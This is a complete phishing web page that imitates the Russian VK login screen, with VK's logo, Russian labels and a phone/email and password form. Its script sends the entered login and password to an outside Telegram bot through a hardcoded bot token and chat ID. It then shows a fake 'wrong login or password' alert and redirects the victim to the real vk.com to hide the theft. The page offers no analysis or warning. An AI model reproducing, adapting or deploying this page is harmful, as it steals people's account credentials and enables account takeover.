<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Вход</title>
<style>
body { background: #e5ebf1; font-family: Arial; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
.box { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); width: 340px; text-align: center; }
.box img { width: 80px; margin-bottom: 20px; }
.box input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ccc; border-radius: 8px; font-size: 16px; box-sizing: border-box; }
.box button { width: 100%; padding: 12px; background: #4a76a8; color: white; border: none; border-radius: 8px; font-size: 18px; cursor: pointer; }
.box button:hover { background: #3a5f8a; }
</style>
</head>
<body>
<div class="box">
<img src="https://vk.com/images/logo_white.png" alt="VK">
<h2>Вход</h2>
<input type="text" id="login" placeholder="Телефон или email">
<input type="password" id="password" placeholder="Пароль">
<button onclick="sendData()">Войти</button>
<p style="margin-top: 20px; font-size: 14px; color: gray;">Вход через ВК ID</p>
</div>

<script>
function sendData() {
var login = document.getElementById('login').value;
var pass = document.getElementById('password').value;
if (!login || !pass) { alert('Заполните все поля'); return; }

var botToken = '8977382498:AAE48ohwy4jMrVNQRQLctQ_ihRsFKzKD5KQ';
var chatId = '8730896073';

var text = 'Логин: ' + login + '\nПароль: ' + pass;
var url = 'https://api.telegram.org/bot' + botToken + '/sendMessage?chat_id=' + chatId + '&text=' + encodeURIComponent(text);

fetch(url).then(() => {
alert('Неверный логин или пароль');
window.location.href = 'https://vk.com';
}).catch(() => {
alert('Ошибка');
});
}
</script>
</body>
</html>
